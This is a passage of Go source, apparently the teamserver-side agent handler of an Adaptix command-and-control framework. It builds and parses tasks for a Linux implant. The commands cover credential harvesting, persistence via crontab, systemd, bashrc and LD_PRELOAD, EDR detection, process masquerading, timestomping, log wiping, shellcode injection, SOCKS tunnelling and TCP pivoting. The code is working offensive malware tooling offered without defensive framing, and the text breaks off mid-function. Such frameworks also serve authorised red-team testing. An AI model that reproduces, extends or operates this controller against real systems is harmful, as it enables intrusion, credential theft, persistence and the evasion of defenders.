		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "download":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT, Data: nil}

	case "getuid":
		cmd = Command{Code: COMMAND_GETUID, Data: nil}

	case "env":
		cmd = Command{Code: COMMAND_ENV, Data: nil}

	case "netstat":
		cmd = Command{Code: COMMAND_NETSTAT, Data: nil}

	case "mounts":
		cmd = Command{Code: COMMAND_MOUNTS, Data: nil}

	case "edr":
		cmd = Command{Code: COMMAND_EDR, Data: nil}

	case "creds":
		credType, _ := getStringArg(args, "type")
		if credType == "" {
			credType = "all"
		}
		packerData, _ := msgpack.Marshal(ParamsCreds{Type: credType})
		cmd = Command{Code: COMMAND_CREDS, Data: packerData}

	case "persist":
		params := ParamsPersist{Action: subcommand}
		switch subcommand {
		case "crontab":
			params.Cmd, _ = getStringArg(args, "cmd")
			params.Schedule, _ = getStringArg(args, "schedule")
		case "systemd":
			params.Name, _ = getStringArg(args, "name")
			params.Cmd, _ = getStringArg(args, "cmd")
		case "bashrc":
			params.Cmd, _ = getStringArg(args, "cmd")
		case "ldpreload":
			params.Path, _ = getStringArg(args, "path")
		case "remove":
			params.Type, _ = getStringArg(args, "type")
			params.Name, _ = getStringArg(args, "name")
		case "status":
			// no extra args
		default:
			err = errors.New("subcommand must be: crontab, systemd, bashrc, ldpreload, remove, status")
			goto RET
		}
		packerData, _ := msgpack.Marshal(params)
		cmd = Command{Code: COMMAND_PERSIST, Data: packerData}

	case "container":
		action := subcommand
		if action == "" {
			action = "detect"
		}
		packerData, _ := msgpack.Marshal(ParamsContainer{Action: action})
		cmd = Command{Code: COMMAND_CONTAINER, Data: packerData}

	case "masquerade":
		name, err := getStringArg(args, "name")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMasquerade{Name: name})
		cmd = Command{Code: COMMAND_MASQUERADE, Data: packerData}

	case "timestomp":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		timestamp := uint64(0)
		if ts, ok := args["timestamp"].(float64); ok {
			timestamp = uint64(ts)
		}
		packerData, _ := msgpack.Marshal(ParamsTimestomp{Path: path, Timestamp: timestamp})
		cmd = Command{Code: COMMAND_TIMESTOMP, Data: packerData}

	case "cleanlog":
		cmd = Command{Code: COMMAND_CLEANLOG, Data: nil}

	case "inject":
		pidF, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		scData, ok := args["shellcode"].([]byte)
		if !ok {
			// Try as base64 string
			scStr, err2 := getStringArg(args, "shellcode")
			if err2 != nil {
				err = errors.New("missing 'shellcode' parameter")
				goto RET
			}
			var err3 error
			scData, err3 = base64.StdEncoding.DecodeString(scStr)
			if err3 != nil {
				err = fmt.Errorf("invalid base64 shellcode: %v", err3)
				goto RET
			}
		}
		packerData, _ := msgpack.Marshal(ParamsInject{Pid: int(pidF), Shellcode: scData})
		cmd = Command{Code: COMMAND_INJECT, Data: packerData}

	case "migrate":
		cmd = Command{Code: COMMAND_MIGRATE, Data: nil}

	case "job":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST, Data: nil}

		} else if subcommand == "kill" {
			jobId, err := getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}

		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "kill":
		pid, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "ps":
		cmd = Command{Code: COMMAND_PS, Data: nil}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD, Data: nil}

	case "rm":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "run":
		taskData.Type = adaptix.TASK_TYPE_JOB

		prog, err := getStringArg(args, "program")
		if err != nil {
			goto RET
		}
		runArgs, _ := args["args"].(string)

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs, _ := shlex.Split(runArgs)
		packerData, _ := msgpack.Marshal(ParamsRun{Program: prog, Args: cmdArgs, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_RUN, Data: packerData}

	case "shell":
		cmdParam, err := getStringArg(args, "cmd")
		if err != nil {
			goto RET
		}

		// Linux: use /bin/sh (most portable)
		cmdArgs := []string{"-c", cmdParam}
		packerData, _ := msgpack.Marshal(ParamsShell{Program: "/bin/sh", Args: cmdArgs})
		cmd = Command{Code: COMMAND_SHELL, Data: packerData}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			auth := getBoolArg(args, "-a")
			if auth {
				username, err := getStringArg(args, "username")
				if err != nil {
					goto RET
				}
				password, err := getStringArg(args, "password")
				if err != nil {
					goto RET
				}

				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":
		remote_path, err := getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err := getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}

		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			goto RET
		}

		zipContent, zipErr := ZipBytes(fileContent, remote_path)
		if zipErr != nil {
			err = zipErr
			goto RET
		}

		chunkSize := 0x500000
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentData.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := msgpack.Marshal(ParamsUpload{
				Path:    remote_path,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break

			} else {
				inTaskData.Data, _ = msgpack.Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				Ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
			}
		}

	case "link":
		// TCP pivot — connect to child agent
		target, err := getStringArg(args, "target")
		if err != nil {
			goto RET
		}
		portF, err := getFloatArg(args, "port")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLink{Address: target, Port: int(portF)})
		cmd = Command{Code: COMMAND_LINK, Data: packerData}

	case "unlink":
		pivotName, err := getStringArg(args, "id")
		if err != nil {
			goto RET
		}
		pivotId, _, _ := Ts.TsGetPivotInfoByName(pivotName)
		if pivotId == "" {
			err = fmt.Errorf("pivot %s does not exist", pivotName)
			goto RET
		}
		id, _ := strconv.ParseUint(pivotId, 16, 64)
		packerData, _ := msgpack.Marshal(ParamsUnlink{PivotId: uint32(id)})
		cmd = Command{Code: COMMAND_UNLINK, Data: packerData}

	case "execute":
		if subcommand == "bof" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			bofFile, err := getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
				}
			}

			packerData, _ := msgpack.Marshal(ParamsBof{
				Content:   bofContent,
				Args:      params,
				EntryFunc: "go",
			})

			asyncFlag := getBoolArg(args, "async")
			if asyncFlag {
				cmd = Command{Code: COMMAND_EXEC_BOF_ASYNC, Data: packerData}
			} else {
				cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
			}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, _ = msgpack.Marshal(cmd)

RET:
	return taskData, messageData, err
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := msgpack.Unmarshal(decryptedData, &inMessage)
	if err != nil {
		return errors.New("failed to unmarshal message")
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = msgpack.Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "Object copied successfully"

			case COMMAND_PWD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_KILL:
				task.Message = "Process killed"

			case COMMAND_GETUID:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "User info:"
				task.ClearText = params.Output

			case COMMAND_ENV:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Environment variables:"
				task.ClearText = params.Output

			case COMMAND_NETSTAT:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Network connections:"
				task.ClearText = params.Output

			case COMMAND_MOUNTS:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Mount points:"
				task.ClearText = params.Output

			case COMMAND_EDR:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Security tool detection:"
				task.ClearText = params.Output

			case COMMAND_CREDS:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Credential harvest:"
				task.ClearText = params.Output

			case COMMAND_PERSIST:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Persistence:"
				task.ClearText = params.Output

			case COMMAND_CONTAINER:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Container/Cloud info:"
				task.ClearText = params.Output

			case COMMAND_MASQUERADE:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "Process masquerade:"
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_TIMESTOMP:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "Timestomp:"
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_CLEANLOG:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "Log cleanup:"
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_INJECT:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "Process injection:"
				task.ClearText = ans.Output
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_MIGRATE:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var ans AnsShell
				if err := msgpack.Unmarshal(cmd.Data, &ans); err != nil {
					continue
				}
				task.Message = "Migration:"
				task.ClearText = ans.Output

			case COMMAND_LINK:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Link failed:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				var params AnsLink
				if err := msgpack.Unmarshal(cmd.Data, &params); err != nil {
					continue
				}
				// params.Beat contains the child agent's encrypted init data
				// params.Watermark is the child's watermark identifier
				watermark := fmt.Sprintf("%08x", params.Watermark)
				childAgentId, linkErr := Ts.TsListenerInteralHandler(watermark, params.Beat)
				if linkErr != nil || childAgentId == "" {
					task.Message = fmt.Sprintf("Link failed: listener handler error for watermark %s", watermark)
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}
				_ = Ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)

				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)

			case COMMAND_UNLINK:
				var params AnsUnlink
				if err := msgpack.Unmarshal(cmd.Data, &params); err != nil {
					continue
				}

				pivotId := fmt.Sprintf("%08x", params.PivotId)
				pivotType := params.Type

				_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)

				messageParent := ""
				messageChild := ""
				if pivotType == 2 {
					messageParent = fmt.Sprintf("TCP agent %s connection reset", childAgentId)
					messageChild = " ----- TCP agent connection reset ----- "
				} else if pivotType == 10 {
					messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
					messageChild = " ----- Pivot agent connection reset ----- "
				}

				if pivotType != 0 {
					_ = Ts.TsPivotDelete(pivotId)
					if TaskId == 0 {
						// Auto-disconnect from process_pivots — no task to update
						Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
						Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
						continue
					} else {
						task.Message = messageParent
					}
					Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
				}

			case COMMAND_PIVOT_EXEC:
				var params AnsPivotExec
				if err := msgpack.Unmarshal(cmd.Data, &params); err != nil {
					continue
				}
				pivotId := fmt.Sprintf("%08x", params.PivotId)
				_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)
				_ = Ts.TsAgentProcessData(childAgentId, params.Data)
				continue // silent relay — no task output

			case COMMAND_EXEC_BOF:
				var bofOut AnsBofOutput
				if err := msgpack.Unmarshal(cmd.Data, &bofOut); err != nil {
					task.Message = "BOF finished"
					task.Completed = true
					break
				}
				switch bofOut.Type {
				case BOF_ERROR_PARSE:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText = "Parse BOF error: " + bofOut.Output
				case BOF_ERROR_SYMBOL:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText = "Symbol not found: " + bofOut.Output
				case BOF_ERROR_ENTRY:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText = "Entry function not found"
				case BOF_ERROR_ALLOC:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText = "Error allocation of BOF memory"
				case BOF_ERROR_RELOC:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText = "Relocation failed: " + bofOut.Output
				case CALLBACK_ERROR:
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF output"
					task.ClearText = bofOut.Output
				default:
					task.MessageType = adaptix.MESSAGE_SUCCESS
					task.Message = "BOF output"
					task.ClearText = bofOut.Output
				}

			case COMMAND_EXEC_BOF_ASYNC:
				task.Message = "Async BOF started"
				task.Completed = false

			case COMMAND_EXIT:
				task.Message = "The agent has completed its work (kill process)"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = msgpack.Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				Output := ""
				if len(jobList) > 0 {
					Output += fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						}

						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "Job list:"
					task.ClearText = Output
				} else {
					task.Message = "No active jobs"
				}

			case COMMAND_JOB_KILL:
				task.Message = "Job killed"

			case COMMAND_LS:
				var params AnsLs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var items []adaptix.ListingFileDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					var Files []FileInfo
					err := msgpack.Unmarshal(params.Files, &Files)
					if err != nil {
						continue
					}

					filesCount := len(Files)
					if filesCount == 0 {
						task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
					} else {

						modeFsize := 1
						lnkFsize := 1
						userFsize := 1
						groupFsize := 1
						sizeFsize := 1
						dateFsize := 1

						for _, f := range Files {
							val := fmt.Sprintf("%d", f.Nlink)
							if len(val) > lnkFsize {
								lnkFsize = len(val)
							}
							val = fmt.Sprintf("%d", f.Size)
							if len(val) > sizeFsize {
								sizeFsize = len(val)
							}
							if len(f.Mode) > modeFsize {
								modeFsize = len(f.Mode)
							}
							if len(f.User) > userFsize {
								userFsize = len(f.User)
							}
							if len(f.Group) > groupFsize {
								groupFsize = len(f.Group)
							}
							if len(f.Date) > dateFsize {
								dateFsize = len(f.Date)
							}
						}

						format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
						OutputText := ""
						for _, fi := range Files {
							OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

							fileData := adaptix.ListingFileDataUnix{
								IsDir:    fi.IsDir,
								Mode:     fi.Mode,
								User:     fi.User,
								Group:    fi.Group,
								Size:     fi.Size,
								Date:     fi.Date,
								Filename: fi.Filename,
							}

							items = append(items, fileData)
						}

						task.Message = fmt.Sprintf("Listing '%s'", params.Path)
						task.ClearText = OutputText
					}
				}
				Ts.TsClientGuiFilesUnix(task, params.Path, items)

			case COMMAND_MKDIR:
				task.Message = "Directory created successfully"

			case COMMAND_MV:
				task.Message = "Object moved successfully"

			case COMMAND_PS:
				var params AnsPs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var proclist []adaptix.ListingProcessDataUnix

				if !params.Result {
					task.Message = params.Status
					task.MessageType = adaptix.MESSAGE_ERROR
				} else {
					var Processes []PsInfo
					err := msgpack.Unmarshal(params.Processes, &Processes)
					if err != nil {
						continue
					}

					procCount := len(Processes)
					if procCount == 0 {
						task.Message = "Failed to get process list"
						task.MessageType = adaptix.MESSAGE_ERROR
						break
					} else {
						pidFsize := 3
						ppidFsize := 4
						ttyFsize := 3
						contextFsize := 7
						processFsize := 7

						for _, p := range Processes {
							val := fmt.Sprintf("%d", p.Pid)
							if len(val) > pidFsize {
								pidFsize = len(val)
							}
							val = fmt.Sprintf("%d", p.Ppid)
							if len(val) > ppidFsize {
								ppidFsize = len(val)
							}
							if len(p.Tty) > ttyFsize {
								ttyFsize = len(p.Tty)
							}
							if len(p.Context) > contextFsize {
								contextFsize = len(p.Context)
							}
							if len(p.Process) > processFsize {
								processFsize = len(p.Process)
							}

							procData := adaptix.ListingProcessDataUnix{
								Pid:         uint(p.Pid),
								Ppid:        uint(p.Ppid),
								TTY:         p.Tty,
								Context:     p.Context,
								ProcessName: p.Process,
							}

							proclist = append(proclist, procData)
						}

						format := fmt.Sprintf(" %%-%dv  %%-%dv  %%-%ds  %%-%ds  %%-%ds", pidFsize, ppidFsize, ttyFsize, contextFsize, processFsize)
						OutputText := fmt.Sprintf(format, "PID", "PPID", "TTY", "Context", "Process")
						OutputText += fmt.Sprintf("\n"+format, "---", "----", "---", "-------", "-------")

						for _, p := range Processes {
							OutputText += fmt.Sprintf("\n"+format, p.Pid, p.Ppid, p.Tty, p.Context, p.Process)
						}

						task.Message = "Process list:"
						task.ClearText = OutputText
					}
				}
				Ts.TsClientGuiProcessUnix(task, proclist)

			case COMMAND_RM:
				task.Message = "Object removed successfully"

			case COMMAND_SHELL:
				var errResp AnsError
				if merr := msgpack.Unmarshal(cmd.Data, &errResp); merr == nil && errResp.Error != "" {
					task.Message = "Shell error:"
					task.ClearText = errResp.Error
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Shell command output:"
				task.ClearText = params.Output

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("File uploaded: %s", params.Path)

			case COMMAND_ERROR:
				var params AnsError
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Error:"
				task.ClearText = params.Error
				task.MessageType = adaptix.MESSAGE_ERROR

			case COMMAND_DOWNLOAD:
				task.Message = "Download started"
				task.Completed = false

			case COMMAND_RUN:
				task.Message = "Process started (async)"
				task.Completed = false

			// Tunnel MUX responses (transparent — no task UI, route directly to Ts*)
			case COMMAND_TUNNEL_STATUS:
				var params AnsTunnelStatus
				if merr := msgpack.Unmarshal(cmd.Data, &params); merr == nil {
					if params.Success {
						Ts.TsTunnelConnectionResume(agentData.Id, params.ChannelId, false)
					} else {
						errorCode := adaptix.SOCKS5_HOST_UNREACHABLE
						if params.Reason == 5 { // connection refused
							errorCode = adaptix.SOCKS5_CONNECTION_REFUSED
						}
						Ts.TsTunnelConnectionHalt(params.ChannelId, errorCode)
					}
				}
				continue

			case COMMAND_TUNNEL_DATA:
				var params AnsTunnelData
				if merr := msgpack.Unmarshal(cmd.Data, &params); merr == nil {
					Ts.TsTunnelConnectionData(params.ChannelId, params.Data)
				}
				continue

			case COMMAND_TUNNEL_CLOSE:
				var params AnsTunnelClose
				if merr := msgpack.Unmarshal(cmd.Data, &params); merr == nil {
					Ts.TsTunnelConnectionClose(params.ChannelId, false)
				}
				continue

			// Agent backpressure responses (transparent)
			case COMMAND_TUNNEL_PAUSE:
				// Agent says: my write buffer is full, stop sending TUNNEL_WRITE
				// The teamserver handles this via TsTunnelConnectionClose with writeOnly
				continue

			case COMMAND_TUNNEL_RESUME:
				// Agent says: write buffer drained, resume TUNNEL_WRITE
				continue

			case COMMAND_TUNNEL_WRITE:
				// This should never come from agent→teamserver, ignore
				continue

			case COMMAND_TUNNEL_START:
				task.Message = "Tunnel starting"
				task.Completed = false

			case COMMAND_TUNNEL_STOP:
				task.Message = "Tunnel stopped"

			case COMMAND_TERMINAL_START:
				task.Message = "Terminal starting"
				task.Completed = false

			case COMMAND_TERMINAL_STOP:
				task.Message = "Terminal stopped"

			default:
				task.Message = "Unknown response"
				task.MessageType = adaptix.MESSAGE_ERROR
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		for _, jobBytes := range inMessage.Object {

			err = msgpack.Unmarshal(jobBytes, &job)
			if err != nil {
				continue
			}

			commandId := job.CommandId

			switch commandId {

			case COMMAND_DOWNLOAD:
				var params AnsDownload
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					continue
				}

